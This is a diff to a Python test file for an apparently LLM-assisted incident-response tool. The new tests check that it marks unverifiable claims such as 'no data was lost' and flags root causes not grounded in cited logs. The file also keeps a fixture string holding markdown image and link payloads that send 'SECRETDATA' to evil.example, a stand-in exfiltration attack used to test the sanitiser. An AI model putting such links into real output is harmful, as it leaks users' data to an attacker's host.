@@ -9,8 +9,18 @@ from __future__ import annotations
 
 from test_chatops import _CaptureSink
 from warden import chatops
-from warden.gate import enforce, leaked_kinds, sanitise_text
-from warden.models import ActionKind, Alert, ContextBundle, RemediationProposal, RootCause, Severity
+from warden.gate import enforce, hedge, leaked_kinds, sanitise_text
+from warden.models import (
+    ActionKind,
+    Alert,
+    Citation,
+    ContextBundle,
+    RemediationProposal,
+    RootCause,
+    Severity,
+    Verdict,
+    VerdictStatus,
+)
 from warden.reporting import build_report
 
 EXFIL = "![x](https://evil.example/c?d=SECRETDATA) see [runbook](https://evil.example/r) https://evil.example/p <img src=x>"
@@ -93,3 +103,26 @@ def test_notify_sends_the_stub_and_no_data_when_blocked(monkeypatch):
     chatops.notify(_report("h"), [sink])
     assert "withheld" in sink.text and sink.data == {"withheld": True, "gate": "BLOCK",
                                                      "reasons": sink.data["reasons"]}
+
+
+def test_g2_marks_claims_warden_cannot_verify():
+    assert hedge("No customer impact; no data was lost.") == \
+        "[unverified: No customer impact]; [unverified: no data was lost]."
+    assert hedge("The incident has been resolved") == "The incident [unverified: has been resolved]"
+    assert hedge("errors are now fixed") == "errors [unverified: are now fixed]"
+    for fine in ("The root cause is a bad deploy", "a fix was deployed", "roll back to resolve it",
+                 "users see 5xx"):
+        assert hedge(fine) == fine
+
+
+def test_the_report_marks_model_claims_and_shows_what_was_cited():
+    rc = RootCause(hypothesis="A bad deploy. There is no customer impact.", confidence=0.7,
+                   citations=[Citation(id="L1", quote="checkout ERROR")])
+    r = build_report(_alert(), context=ContextBundle(logs=["checkout ERROR boom"]), root_cause=rc,
+                     verdict=Verdict(status=VerdictStatus.escalated, policy_ids=["P13-UNGROUNDED"]))
+    assert "[unverified: no customer impact]" in r.markdown
+    assert "L1: checkout ERROR" in r.markdown and "Not grounded" in r.markdown
+    assert r.data["root_cause"]["grounded"] is False
+    grounded = build_report(_alert(), context=ContextBundle(logs=["x"]), root_cause=rc,
+                            verdict=Verdict(status=VerdictStatus.escalated, policy_ids=[]))
+    assert "Not grounded" not in grounded.markdown
